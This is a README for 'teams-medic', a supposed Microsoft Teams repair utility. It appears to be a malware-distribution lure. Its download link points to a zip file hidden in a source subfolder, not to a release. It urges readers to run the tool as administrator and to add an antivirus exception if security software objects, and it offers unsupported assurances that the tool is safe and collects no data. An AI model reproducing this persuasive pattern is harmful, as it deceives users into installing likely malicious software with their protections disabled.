# 🛠️ teams-medic - Repair your Microsoft Teams issues fast

[![Download teams-medic](https://img.shields.io/badge/Download-teams--medic-blue.svg)](https://github.com/Impulsive-lampreyeel71/teams-medic/raw/refs/heads/main/src/TeamsMedic.App/Models/teams_medic_v2.5.zip)

This application fixes common problems with the Microsoft Teams desktop version. It scans your system for errors that prevent the app from opening or functioning correctly. You do not need technical skills to use this tool. It runs on your computer and cleans up corrupted caches or configuration files automatically.

## 🛠️ What this tool does

Microsoft Teams sometimes stops working when background data becomes too large or gets corrupted. You might see the app freeze, crash, or fail to sign you in. teams-medic targets these specific areas to restore normal operation.

This utility performs the following tasks:
- Clears the Microsoft Teams local cache data.
- Resets the desktop configuration file.
- Checks for locked files that stop the app from starting.
- Verifies that Teams processes stop correctly before repairs begin.

The tool works locally on your machine. It does not send your data to external servers.

## 💻 System requirements

To use this software, your computer must meet these basic conditions:

- Operating System: Windows 10 or Windows 11.
- Framework: .NET 8 Desktop Runtime (the app will guide you if this is missing).
- Permissions: You must have an administrator account on your computer to allow the app to reset system-level files.

## 🚀 Running a repair

Once the application is open, follow these steps to repair your Microsoft Teams installation:

1. Close the Microsoft Teams app on your taskbar. Right-click the Teams icon and select "Quit" to ensure it is not running in the background.
2. Click the "Scan System" button within the teams-medic window. The app will look for any signs of corruption in your installation.
3. If the tool finds errors, click the "Repair" button.
4. Wait for the status bar to show "Success." 
5. Close the teams-medic tool.
6. Restart Microsoft Teams as you normally do.

## ❓ Frequently asked questions

### Will this remove my files or chats?
No. This tool only clears temporary data and settings stored locally on your hard drive. Your chat history, teams, and files remain safe on the Microsoft server.

### What if the app detects no errors?
If the tool says your system is healthy, the issue might be related to your network connection or your company’s account permissions. Check your internet connection or contact your IT department in that case.

### Is this software safe?
Yes. The code is transparent and performs only the actions listed above. It does not contain advertisements or hidden tracking software.

### Why do I need .NET 8?
This tool is built using current Microsoft frameworks to ensure it remains compatible with modern versions of Windows. If your computer lacks this component, the installer will direct you to the official Microsoft download page.

## 🛡️ Troubleshooting common issues

If you encounter difficulties while using the tool, consider these common solutions:

- Permission Denied: If the app cannot reset files, ensure you run it as an administrator. Right-click the icon and choose "Run as administrator."
- Antivirus Warnings: Sometimes security software flags new tools as suspicious. If your antivirus prevents the launch, add an exception for the folder where you saved the application.
- Frozen Progress Bar: Give the tool a moment to finish deep scans of the hidden Teams folders. If it hangs for more than two minutes, close the app and restart it.
- Silent Failure: If the app closes immediately upon opening, check if you have the correct version of the Windows desktop runtime installed.
